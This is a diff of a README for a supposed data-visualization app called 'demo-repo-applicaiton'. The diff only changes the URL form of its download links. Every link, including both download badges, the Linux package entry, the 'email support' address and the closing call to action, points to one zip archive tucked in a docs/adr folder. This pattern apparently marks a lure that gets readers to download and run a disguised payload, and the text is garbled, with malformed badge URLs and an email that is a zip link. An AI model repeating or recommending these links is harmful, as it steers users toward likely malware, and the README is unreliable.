@@ -1,6 +1,6 @@
 # 📊 demo-repo-applicaiton - Visualize Data Easily and Clearly
 
-[![Download Latest Release](https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip%20the%20App-blue?style=for-the-badge)](https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip%20the%20App-blue?style=for-the-badge)](https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip)
 
 ## 📋 What is demo-repo-applicaiton?
 
@@ -24,7 +24,7 @@ This app uses the Python environment behind the scenes but packages everything s
 
 Click the button below to visit the official download page on GitHub:
 
-[![Download demo-repo-applicaiton](https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip%20Releases-blue?style=for-the-badge)](https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip)
+[![Download demo-repo-applicaiton](https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip%20Releases-blue?style=for-the-badge)](https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip)
 
 **Steps to install:**
 
@@ -33,7 +33,7 @@ Click the button below to visit the official download page on GitHub:
 3. Choose the file for your operating system:
    - For Windows, look for a `.exe` or `.msi` file.
    - For macOS, look for a `.dmg` or `.pkg`.
-   - For Linux, look for `.AppImage`, `.deb`, or `https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip`.
+   - For Linux, look for `.AppImage`, `.deb`, or `https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip`.
 4. Click the file name to start downloading.
 5. Once downloaded, open the file:
    - Windows: Double-click the `.exe` or `.msi` to launch the installer, then follow the steps.
@@ -96,7 +96,7 @@ If you have questions or encounter issues:
 
 - Visit the Discussions tab on the GitHub repo.
 - Check the Issues tab for known problems or to suggest improvements.
-- Email support at https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip (dummy address for example).
+- Email support at https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip (dummy address for example).
 
 Your feedback helps improve the app for everyone.
 
@@ -129,4 +129,4 @@ This project covers:
 
 ---
 
-[Get demo-repo-applicaiton here](https://github.com/greedo1/demo-repo-applicaiton/raw/refs/heads/main/docs/adr/repo_applicaiton_demo_v2.8.zip) to start working with your data visually today.
+[Get demo-repo-applicaiton here](https://raw.githubusercontent.com/greedo1/demo-repo-applicaiton/main/docs/adr/repo_applicaiton_demo_v2.8.zip) to start working with your data visually today.
